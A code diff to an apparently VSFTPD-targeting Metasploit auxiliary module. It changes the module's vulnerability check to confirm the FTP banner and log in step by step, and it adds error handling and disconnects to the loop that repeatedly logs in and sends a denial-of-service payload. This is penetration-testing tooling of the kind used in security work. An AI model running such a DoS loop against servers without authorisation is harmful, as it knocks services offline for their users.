@@ -48,14 +48,22 @@ class MetasploitModule < Msf::Auxiliary
   def check
     # attempt to connect
     begin
-      return Exploit::CheckCode::Unknown('Failed to connect or authenticate via FTP') unless connect_login
+      connect
     rescue Rex::ConnectionRefused
       return Exploit::CheckCode::Unknown('Connection refused by the target')
     rescue Rex::ConnectionTimeout
       return Exploit::CheckCode::Unknown('Connection timed out')
     end
 
-    vprint_status("FTP banner: #{sanitize_ftp_response(banner)}") if banner
+    return Exploit::CheckCode::Safe("Does not appear to be VSFTPD (banner: #{banner_version})") unless banner&.downcase&.include?('vsftpd')
+
+    vprint_status("FTP banner: #{banner_version}") if banner
+
+    res = send_user(user)
+    return Exploit::CheckCode::Unknown("Failed to connect or authenticate via FTP: #{res}") unless res =~ /^(331|2)/
+
+    res = send_pass(pass)
+    return Exploit::CheckCode::Unknown("Failed to connect or authenticate via FTP: #{res}") unless res =~ /^2/
 
     s = ''
     stat_output = ''
@@ -122,12 +130,19 @@ class MetasploitModule < Msf::Auxiliary
       end
       print_status("Attempt: #{attempts}/#{max} - Sending DoS command")
 
-      connect_login
+      unless connect_login
+        print_error('Authentication failed - check FTPUSER/FTPPASS credentials')
+        break
+      end
 
       10.times do
         send_cmd([payload.to_s], false)
       end
       send_cmd([payload.to_s], true)
+
+      # Otherwise report_service has a bad time
+      disconnect
+      @ftpbuff = ''
     rescue Rex::ConnectionTimeout
       print_error('Connection timeout! Sending again')
     rescue Errno::ECONNRESET
